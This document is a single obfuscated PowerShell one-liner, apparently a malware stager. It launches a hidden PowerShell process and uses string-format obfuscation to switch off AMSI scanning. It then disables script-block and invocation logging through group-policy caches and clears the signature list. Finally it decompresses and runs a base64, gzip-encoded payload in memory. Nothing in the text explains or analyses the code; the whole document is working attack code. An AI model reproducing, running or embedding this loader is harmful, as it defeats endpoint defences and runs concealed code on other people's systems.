$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $hZb=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $bJ5G=[Ref].Assembly.GetType(((''''+''{0}{''+''2''+''}stem''+''.{''+''1}a{9}a{''+''4}''+''e''+''me{9}t.''+''{''+''7}''+''{5''+''}''+''t{''+''8}mati{8}{9''+''}''+''.{7}''+''m''+''s''+''i{''+''6}ti{3}s'')-f''S'',''M'',''y'',''l'',''g'',''u'',''U'',''A'',''o'',''n'')); if ($bJ5G) { $bJ5G.GetField(((''a''+''m''+''{0''+''}''+''i{4}{3}''+''i{2}F''+''ail''+''e''+''{1}'')-f''s'',''d'',''t'',''n'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $kEG=((''En{3}b''+''le{0}c''+''rip{2''+''}{1}''+''lo''+''ckLogging'')-f''S'',''B'',''t'',''a''); $nzV=((''Enabl''+''{0}Sc{1}i{5}tBlo''+''c''+''{2}{''+''3}n''+''voc''+''ation{4''+''}ogging'')-f''e'',''r'',''k'',''I'',''L'',''p''); $bulnh=((''Scrip''+''tB''+''{2}oc''+''k{1}oggi{0}g''+'''')-f''n'',''L'',''l''); $iwP=[Ref].Assembly.GetType(((''{''+''5''+''}{1}stem''+''.{0}ana{3''+''}ement.A{4}tomation.Uti''+''{2}''+''s''+'''')-f''M'',''y'',''l'',''g'',''u'',''S'')); $hnj=$iwP.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hnj) { $zxGG=$hnj.GetValue($null); $hZb.Add($kEG,0); $hZb.Add($nzV,0); $zxGG[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$bulnh]=$hZb; If($zxGG[$bulnh]){ $zxGG[$bulnh][$nzV]=0; $zxGG[$bulnh][$kEG]=0; } } Else { [Ref].Assembly.GetType(((''Sy''+''{0}tem.Management.Autom''+''at''+''i''+''on.Sc{1}i{''+''4}t{3}''+''{5}''+''oc{''+''2}'')-f''s'',''r'',''k'',''B'',''p'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAENOkmMCA7VWbW/iOBD+vtL''+''+h2iF''+''lESlhDd1t5VWOgdKAwuUb''+''SCUcuhkEidxMTFNnFK{2}t//9xi''+''Fp2dv2rnfSWkI49sx4/MwzM/bTyBWUR8rO85Vv798p+RjhGK8VrRSuSFkprZpB51F/3i3tWqfDS+Wzos3RZt{1}ma0yjxdlZK41jEon9d+WCCJQkZL1klCSarvypTEMSk+{1}L5S1xhfJNKf1RuWB8iVkutmthNyTKMYo8udfnLpauVewNo0JTf/9d1efHtUXl/C7FLNFUe5cIsq54jKm{2}8l2XB453G{2}KpA+rG{1}OG+qExp1KhXJlGCfTIEa/dkQETIvUSF2zzfJy''+''Yija{1}8WtLOXkpTYTqKuYs8LyZJopaVuTxhvlj8ps3z4{2}/SSNA1qXQjQWK+sUl8T12SVCwceYxcEX8BWraIaRQsdB3E7vmKaKUoZays/Bcz2pBsC/DeqqQdKoHUSMR{2}GcL{2}0kUH3EsZ2auqL3gquaDDeOIDQ{1}hdougXHHoM0Qscel4oxjzbIeCzNuIJzXQ/K9WyMoDDseDxDj5L4zgl+uIJcaV0S84n5bdaqxWqoOhdbU48WJs7nHqLZws/cKC0faRjKfQ{2}o9vEpxFp7yK8pm5BWu2luBCfkQyTSiE2BBc1Nd8gXpswEmAhgZb0+EntfE3Fk{2}{2}ZUuaRGLkQ2wS8grDr{1}zqzj52mdqMBWQN++2/ga8mHVCGFdJ4eu+J0+Q1CaovhJCkroxRy1S0rNsGMeGUFRQnNt1AqeDZVn90dpExQFyeiMLfQ/wZnfmyLR4mIUxciCxCM7Q1xKWYSkbJiUY+YO5sGxfH''+''qi3i0MGOQQWDpHuIBKxIHW0i+xOBpxg29Yh{1}RXW8YWYN''+''MVjs''+''{2}DAdQKfI8y''+''QiGA+KprzhaZMOe+hKZApIDNyHcNuOirDg0FlCJJMoZw/{2}XGz8XocyfVkzy+GhFms3NnZCJUIrDW8nTHKQMklgAHJ2Yr02''+''ckJ{1}mvtxoH4xLOkIwZt2IDbzeita''+''{2}W/gN4DehjS5vf/S+9G4tY+C2ktFF5xOi22Drfhoi1+t55NQGua+02v3kbC34N5uha1bHCOa1IJh0RfcCWe{1}QZdXR+erBaCZVurWm0tbehttsWtdV1Gg0LxvVFeA3A70V8oZrun3owxzq{2}mXf7CZmtcvOe{2}2r5bTeuZkyy2h2Qn/KE/t''+''k1jYM49TD7cEOIZN7jcHuunbFx5a''+''7Ng3DSXvIh''+''OttHjpXX3FrjfC2bdSmvD912tSYchMH{1}X4SGH5zZDisHrSQ2XEpubk779xc40F/''+''Oaz7Rm12''+''jdpN''+''ZyZxcuq0cTK+hS''+''Oda2yNk8sjy{2}g5BOZOOp5a0jbCwdXUAVt1N/SN02n7CJlH/VlSxyuTZ950bu7QRTjbdEYM9seTOkcOG15j1L/ZdQw4b9REVtNC7mDzEF1vth/vA8vmX/AX7NzfNIzaeHvhozt0dGTWzKWwzhu9exyYY+N08vkDcGE+oZFo1BelZejIqvn+XWm5tMcHjHitKwxwnISYAVOg2hc52+FxJ{2}/fI0{2}lhqbJt8CKxBFh0DyhvRZMR4xxV/Y{1}Weihde0biuxvk27m00szXXkS1J+7SrF0dnYD{1}kLmAKkrfRIFIixXHxrVKnSD{2}kO1mWXI2y/W4pudJm2VZTvJgMlts8w2mKO+omm/HCp4NQgoXa+C9Rpuc{1}IKCg1Uvn3uS/RMztkhdvm1nohwAB1gVoOLz+V7QRIE9I/JnVISspce9uYSnT3+UsrkBSyE{1}+9fK{1}O89g+7b{2}JRtbzH''+''5qflHxcOqv+vA2CKqQBBGwoxI/vnwYs4''+''5FlyEF4IDeSAnw/5cL5MxfEQnmFZJ/gLGRRKyLMLAAA{0}'')-f''='',''P'',''6'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
